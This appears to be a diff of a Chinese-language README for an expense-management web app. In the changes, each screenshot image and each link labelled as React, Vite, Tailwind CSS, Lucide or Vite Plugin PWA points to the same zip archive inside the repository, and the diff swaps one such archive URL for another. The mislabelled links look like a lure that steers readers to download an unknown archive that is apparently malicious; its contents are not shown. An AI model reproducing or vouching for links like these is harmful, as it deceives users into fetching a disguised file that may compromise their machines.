@@ -6,11 +6,11 @@
 
 | 首页概览 | 账单列表 | 记账界面 |
 | :---: | :---: | :---: |
-| ![首页](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) | ![账单](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) | ![记账](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) |
+| ![首页](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) | ![账单](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) | ![记账](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) |
 
 | 统计分析 | 个人设置 |
 | :---: | :---: |
-| ![统计](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) | ![设置](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) |
+| ![统计](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) | ![设置](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) |
 
 ## 特性
 
@@ -49,11 +49,11 @@ npm run build
 
 ## 技术栈
 
-- **框架**: [React 19](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip)
-- **构建工具**: [Vite 7](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip)
-- **数据库**: [https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip) (IndexedDB wrapper)
-- **样式**: [Tailwind CSS 4](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip)
-- **图标**: [Lucide React](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip)
+- **框架**: [React 19](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip)
+- **构建工具**: [Vite 7](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip)
+- **数据库**: [https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip) (IndexedDB wrapper)
+- **样式**: [Tailwind CSS 4](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip)
+- **图标**: [Lucide React](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip)
 - **组件库**: 原生 UI 组件
 - **状态管理**: React Hooks
-- **PWA**: [Vite Plugin PWA](https://github.com/yongsinfok/SimpleExpenseManagement/raw/refs/heads/main/src/components/ui/Simple_Expense_Management_sailorman.zip)
+- **PWA**: [Vite Plugin PWA](https://raw.githubusercontent.com/yongsinfok/SimpleExpenseManagement/main/src/pages/Simple_Management_Expense_2.4-beta.4.zip)
